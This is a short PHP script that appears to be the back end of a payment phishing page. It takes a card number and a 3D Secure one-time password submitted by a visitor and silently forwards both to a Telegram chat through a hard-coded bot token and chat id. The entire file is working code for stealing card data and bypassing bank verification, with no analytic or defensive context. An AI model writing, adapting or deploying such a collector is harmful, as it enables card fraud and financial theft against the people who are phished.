<?php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') { http_response_code(403); exit('Access Denied'); }

$otp  = $_POST['otp'] ?? '';
$card = $_POST['card'] ?? '';

// TOKEN YALNIZ BURADA
$botToken = '9124698878:AAHaa7ybeZ-b72I3DN0ptfOM0SxTeHaayMc';
$chatId   = '-1004326178006';

$message = "🔐 3D Secure OTP:\nKart: $card\nOTP: $otp";
$url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
@file_get_contents($url);

http_response_code(200);
exit();
?>
